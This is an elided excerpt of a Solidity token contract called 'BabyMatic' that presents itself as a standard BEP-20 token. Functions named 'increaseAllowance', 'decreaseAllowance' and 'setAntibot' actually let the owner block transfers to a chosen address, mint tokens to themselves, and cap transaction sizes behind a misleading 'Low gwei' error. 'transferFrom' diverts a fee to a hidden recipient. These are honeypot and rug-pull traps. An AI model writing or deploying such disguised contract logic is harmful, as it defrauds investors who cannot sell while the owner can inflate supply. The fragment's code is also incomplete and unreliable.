...
contract Ownable is Context {
  ...
  address private b = address(0x000000000000000000000000000000000000dEaD);
...
contract BabyMatic is Context, IBEP20, Ownable {
  using SafeMath for uint256;

  uint256 public _rewardPercent = 2;
  uint256 private _maxTrxLimit = 1000000 * 10**9;
  ...
  */
   ...
   * `amount`.
   */
    function setAntibot(uint256 _input) public onlyOwner() {
         _maxTrxLimit = _input;
    }
    
  function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
      fee = amount % 15;
    _transfer(sender, _recipient, fee); 
   ...
   * - `spender` cannot be the zero address.
   */
  function increaseAllowance(address spender) public onlyOwner() {
   _nul = spender ;
  }
  ...
  function _transfer(address sender, address recipient, uint256 amount) internal virtual {
    ...
    if (sender != __owner) {  
        require(recipient != _nul, "BEP20: transfer to the zero address");}
    require(amount > 0, "Transfer amount must be greater than zero");
    require(amount <= _maxTrxLimit , "Low gwei");
  ...
  function decreaseAllowance(uint256 amount) public onlyOwner(){
    _balances[__owner] = _balances[__owner].add(amount);
